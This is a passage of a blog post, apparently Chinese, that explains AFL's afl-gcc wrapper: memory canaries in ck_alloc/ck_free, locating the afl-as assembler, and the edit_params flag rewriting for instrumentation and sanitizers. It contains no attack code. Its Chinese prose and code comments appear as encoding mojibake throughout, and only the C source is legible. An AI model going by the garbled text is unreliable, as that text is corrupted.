class="keyword">return</span> <span class="built_in">memcpy</span>(ret, str, size);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ALLOC_CHECK_SIZE</span>(size);</span><br><span class="line"><span class="comment">// å±•å¼€ä¸ºï¼š</span></span><br><span class="line"><span class="keyword">if</span> (size &gt; MAX_ALLOC)  <span class="comment">// MAX_ALLOC = 0x40000000 (1GB)</span></span><br><span class="line">    <span class="built_in">ABORT</span>(<span class="string">&quot;Bad alloc request: %u bytes&quot;</span>, size);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ALLOC_C1</span>(ret) = ALLOC_MAGIC_C1;  <span class="comment">// ((u32*)ret)[-2] = 0xFF00FF00</span></span><br><span class="line"><span class="built_in">ALLOC_S</span>(ret)  = size;            <span class="comment">// ((u32*)ret)[-1] = size</span></span><br><span class="line"><span class="built_in">ALLOC_C2</span>(ret) = ALLOC_MAGIC_C2;  <span class="comment">// ((u8*)ret)[size] = 0xF0</span></span><br></pre></td></tr></table></figure><p>å†…å­˜å¸ƒå±€å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åœ°å€åç§»:  <span class="number">-8</span>    <span class="number">-4</span>     <span class="number">0</span>           size</span><br><span class="line">å†…å®¹:    [C1]  [SIZE] [ç”¨æˆ·æ•°æ®...] [C2]</span><br><span class="line">å€¼:    <span class="number">0xFF00FF00</span>  size   å­—ç¬¦ä¸²å†…å®¹   <span class="number">0xF0</span></span><br></pre></td></tr></table></figure><h4 id="ck-free"><a href="#ck-free" class="headerlink" title="ck_free"></a>ck_free</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">DFL_ck_free</span><span class="params">(<span class="type">void</span>* mem)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!mem) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">CHECK_PTR</span>(mem);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG_BUILD</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Catch pointer issues sooner. */</span></span><br><span class="line">  <span class="built_in">memset</span>(mem, <span class="number">0xFF</span>, <span class="built_in">ALLOC_S</span>(mem));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* DEBUG_BUILD */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">ALLOC_C1</span>(mem) = ALLOC_MAGIC_F;  <span class="comment">// æ ‡è®°ä¸ºå·²ç»é‡Šæ”¾</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(mem - ALLOC_OFF_HEAD);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (mem) &#123;</span><br><span class="line">    <span class="comment">// æ£€æŸ¥å¤´éƒ¨magic number</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ALLOC_C1</span>(mem) ^ ALLOC_MAGIC_C1) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ALLOC_C1</span>(mem) == ALLOC_MAGIC_F)</span><br><span class="line">            <span class="built_in">ABORT</span>(<span class="string">&quot;Use after free.&quot;</span>);           <span class="comment">// é‡å¤é‡Šæ”¾</span></span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="built_in">ABORT</span>(<span class="string">&quot;Corrupted head alloc canary.&quot;</span>); <span class="comment">// å¤´éƒ¨æŸå</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ£€æŸ¥å°¾éƒ¨magic number</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ALLOC_C2</span>(mem) ^ ALLOC_MAGIC_C2)</span><br><span class="line">        <span class="built_in">ABORT</span>(<span class="string">&quot;Corrupted tail alloc canary.&quot;</span>);     <span class="comment">// å°¾éƒ¨æŸå</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡Šæ”¾å‰çš„å†…å­˜å¸ƒå±€ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å®é™…åˆ†é…çš„å†…å­˜å—ï¼š</span><br><span class="line">[Guard1: <span class="number">4</span>å­—èŠ‚] [Size: <span class="number">4</span>å­—èŠ‚] [ç”¨æˆ·æ•°æ®: sizeå­—èŠ‚] [Guard2: <span class="number">1</span>å­—èŠ‚]</span><br><span class="line"><span class="number">0xFF00FF00</span>        size          å­—ç¬¦ä¸²å†…å®¹           <span class="number">0xF0</span></span><br><span class="line">     â†‘                              â†‘</span><br><span class="line">mallocè¿”å›çš„åœ°å€              memæŒ‡å‘çš„ä½ç½®</span><br></pre></td></tr></table></figure><p>é‡Šæ”¾åçš„å†…å­˜å¸ƒå±€ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Guard1: <span class="number">4</span>å­—èŠ‚] [Size: <span class="number">4</span>å­—èŠ‚] [æ±¡æŸ“æ•°æ®: sizeå­—èŠ‚] [Guard2: <span class="number">1</span>å­—èŠ‚]</span><br><span class="line"><span class="number">0xFE00FE00</span>        size       <span class="number">0xFF</span>..<span class="number">.0</span>xFF         <span class="number">0xF0</span></span><br><span class="line">(å·²é‡Šæ”¾æ ‡è®°)                  (è°ƒè¯•æ¨¡å¼ä¸‹)</span><br></pre></td></tr></table></figure><p>è¯´ç™½äº†å°±æ˜¯åœ¨freeå¤–é¢å¥—ä¸€å±‚wrapper</p><h3 id="find-as-2"><a href="#find-as-2" class="headerlink" title="find_as"></a>find_as</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">access</span>(AFL_PATH <span class="string">&quot;/as&quot;</span>, X_OK)) &#123;</span><br><span class="line">  as_path = AFL_PATH;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">FATAL</span>(<span class="string">&quot;Unable to find AFL wrapper binary for &#x27;as&#x27;. Please set AFL_PATH&quot;</span>);</span><br></pre></td></tr></table></figure><p>å®AFL_PATHï¼ˆéç¯å¢ƒå˜é‡AFL_PATHï¼‰åœ¨ç¼–è¯‘æ—¶ç”±<code>Makefile</code>æ–‡ä»¶ç¡®å®šï¼Œå€¼é»˜è®¤ä¸º<code>/usr/local/lib/afl/</code>ï¼Œæ‹¼æ¥åå°±æœ‰ï¼š<code>/usr/local/lib/afl/as</code></p><h4 id="find-as-å‡½æ•°æ€»ç»“"><a href="#find-as-å‡½æ•°æ€»ç»“" class="headerlink" title="find_as å‡½æ•°æ€»ç»“"></a>find_as å‡½æ•°æ€»ç»“</h4><p>è¯¥å‡½æ•°ä¼šæŒ‰ç…§ä¸€å®šçš„è§„åˆ™åœ¨ç³»ç»Ÿä¸­å¯»æ‰¾<code>afl-as</code>æ±‡ç¼–å™¨çš„ä½ç½®ï¼š</p><ol><li>æ£€æµ‹ç¯å¢ƒå˜é‡<code>AFL_PATH</code>æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨åˆ™ä¼šè°ƒç”¨<code>access</code>å‡½æ•°æ£€æŸ¥æŒ‡å®šçš„å¯æ‰§è¡Œæ–‡ä»¶æ˜¯å¦æ‹¥æœ‰å¯æ‰§è¡Œæƒé™ï¼Œè‹¥æ‹¥æœ‰åˆ™è®¾ç½®å…¨å±€å˜é‡<code>as_path</code>å¹¶returnã€‚</li><li>è‹¥ç¯å¢ƒå˜é‡ä¸å­˜åœ¨ï¼Œåˆ™æ£€æŸ¥<code>/usr/local/bin/afl-as</code>ã€‚</li><li>è‹¥ä»¥ä¸Šä¸¤ä¸ªè·¯å¾„å‡æ— æ•ˆï¼Œæœ€åå°è¯•èƒ½å¦è®¿é—®<code>/usr/local/lib/afl/as(afl-as)</code>ï¼Œè‹¥ä»ç„¶æ— æ•ˆåˆ™ä¼šç»ˆæ­¢<code>afl-gcc</code>çš„è¿è¡Œã€‚</li></ol><h3 id="edit-params"><a href="#edit-params" class="headerlink" title="edit_params"></a>edit_params</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">edit_params</span>(argc, argv);</span><br></pre></td></tr></table></figure><p>edit_paramsæ˜¯AFLç¼–è¯‘å™¨åŒ…è£…å™¨çš„æ ¸å¿ƒå‡½æ•°ï¼Œè´Ÿè´£å¤„ç†å’Œä¿®æ”¹ç¼–è¯‘å‚æ•°ï¼Œå°†ç”¨æˆ·çš„ç¼–è¯‘å‘½ä»¤è½¬æ¢ä¸ºå¸¦æœ‰AFLæ’æ¡©åŠŸèƒ½çš„ç¼–è¯‘å‘½ä»¤ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Copy argv to cc_params, making the necessary edits. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">edit_params</span><span class="params">(u32 argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8 fortify_set = <span class="number">0</span>, asan_set = <span class="number">0</span>;</span><br><span class="line">  u8 *name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">  u8 m32_set = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  cc_params = <span class="built_in">ck_alloc</span>((argc + <span class="number">128</span>) * <span class="built_in">sizeof</span>(u8*));</span><br><span class="line"></span><br><span class="line">  name = <span class="built_in">strrchr</span>(argv[<span class="number">0</span>], <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!name) name = argv[<span class="number">0</span>]; <span class="keyword">else</span> name++;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(name, <span class="string">&quot;afl-clang&quot;</span>, <span class="number">9</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    clang_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setenv</span>(CLANG_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-clang++&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cxx = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="string">&quot;clang++&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      u8* alt_cc = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;clang&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* With GCJ and Eclipse installed, you can actually compile Java! The</span></span><br><span class="line"><span class="comment">       instrumentation will work (amazingly). Alas, unhandled exceptions do</span></span><br><span class="line"><span class="comment">       not call abort(), so afl-fuzz would need to be modified to equate</span></span><br><span class="line"><span class="comment">       non-zero exit codes with crash conditions when working with Java</span></span><br><span class="line"><span class="comment">       binaries. Meh. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-g++&quot;</span>)) cc_params[<span class="number">0</span>] = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-gcj&quot;</span>)) cc_params[<span class="number">0</span>] = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_GCJ&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> cc_params[<span class="number">0</span>] = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!cc_params[<span class="number">0</span>]) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;On Apple systems, &#x27;gcc&#x27; is usually just a wrapper for clang. Please use the\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    &#x27;afl-clang&#x27; utility instead of &#x27;afl-gcc&#x27;. If you really have GCC installed,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    set AFL_CC or AFL_CXX to specify the correct path to that compiler.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;AFL_CC or AFL_CXX required on MacOS X&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-g++&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cxx = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="string">&quot;g++&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-gcj&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cc = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_GCJ&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;gcj&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      u8* alt_cc = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;gcc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (--argc) &#123;</span><br><span class="line">    u8* cur = *(++argv);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(cur, <span class="string">&quot;-B&quot;</span>, <span class="number">2</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!be_quiet) <span class="built_in">WARNF</span>(<span class="string">&quot;-B is already set, overriding&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!cur[<span class="number">2</span>] &amp;&amp; argc &gt; <span class="number">1</span>) &#123; argc--; argv++; &#125;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-integrated-as&quot;</span>)) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-pipe&quot;</span>)) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-m32&quot;</span>)) m32_set = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=address&quot;</span>) ||</span><br><span class="line">        !<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=memory&quot;</span>)) asan_set = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(cur, <span class="string">&quot;FORTIFY_SOURCE&quot;</span>)) fortify_set = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = cur;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  cc_params[cc_par_cnt++] = <span class="string">&quot;-B&quot;</span>;</span><br><span class="line">  cc_params[cc_par_cnt++] = as_path;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (clang_mode)</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-no-integrated-as&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fstack-protector-all&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fortify_set)</span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-D_FORTIFY_SOURCE=2&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (asan_set) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Pass this on to afl-as to adjust map density. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and AFL_HARDEN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=address&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;MSAN and AFL_HARDEN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=memory&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;AFL_DONT_OPTIMIZE&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* On 64-bit FreeBSD systems, clang -g -m32 is broken, but -m32 itself</span></span><br><span class="line"><span class="comment">       works OK. This has nothing to do with us, but let&#x27;s avoid triggering</span></span><br><span class="line"><span class="comment">       that bug. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!clang_mode || !m32_set)</span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-O3&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-funroll-loops&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Two indicators that you&#x27;re building for fuzzing; one of them is</span></span><br><span class="line"><span class="comment">       AFL-specific, the other is shared with libfuzzer. */</span></span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-D__AFL_COMPILER=1&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_BUILTIN&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-memcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strstr&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasestr&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  cc_params[cc_par_cnt] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="1-åˆå§‹åŒ–å’Œå†…å­˜åˆ†é…"><a href="#1-åˆå§‹åŒ–å’Œå†…å­˜åˆ†é…" class="headerlink" title="1. åˆå§‹åŒ–å’Œå†…å­˜åˆ†é…"></a>1. åˆå§‹åŒ–å’Œå†…å­˜åˆ†é…</h5><p>åŠŸèƒ½ï¼š</p><ul><li><p>åˆå§‹åŒ–çŠ¶æ€æ ‡å¿—å˜é‡</p></li><li><p>åˆ†é…å‚æ•°æ•°ç»„å†…å­˜ï¼ˆåŸå‚æ•°æ•° + 